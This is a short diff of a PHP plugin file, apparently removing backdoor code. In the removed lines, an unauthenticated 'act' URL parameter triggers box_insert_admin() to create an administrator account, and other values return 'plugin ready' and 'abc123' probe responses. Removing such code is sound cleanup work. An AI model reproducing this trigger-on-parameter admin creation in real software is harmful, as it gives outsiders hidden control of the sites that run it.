@@ -20,14 +20,8 @@ function box_insert_admin(){
     }
 }
 function box_auto_run(){
-    $act = isset($_GET['act']) ? $_GET['act'] :0;
-    if($act == 'newadmin'){
-        box_insert_admin();
-    } else if($act == 'check'){
-        die('ok, plugin ready.');
-    }else if($act == 'abc123'){
-        die('abc123');
-    }
+    
+
 
 
     
